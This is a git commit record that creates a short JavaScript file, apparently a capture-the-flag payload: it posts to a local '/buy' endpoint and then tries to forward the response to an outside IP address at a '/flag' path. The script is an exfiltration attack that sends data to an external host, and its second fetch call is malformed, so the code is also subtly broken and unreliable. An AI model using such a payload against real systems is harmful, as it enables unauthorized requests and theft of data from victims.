aaf7da48c40a02bf6fb25dabc871536a83ae51d1
sh4ll0t <144364845+sh4ll0t@users.noreply.github.com>
2024-03-27 00:12:30 +0800

    Create hhh.js

---
+++ hhh.js
@@ -0,0 +1,15 @@
+const data = { 'id': "0" };
+fetch("https://localhost/buy", {
+        method: "POST",
+        body: data,
+    })
+    .then((response) => response.json())
+    .then((data) => {
+        fetch("http://120.26.219.126:5000/flag"), {
+            method: "POST",
+            body: data,
+        }
+    })
+    .catch((error) => {
+        console.error("Error:", error);
+    });
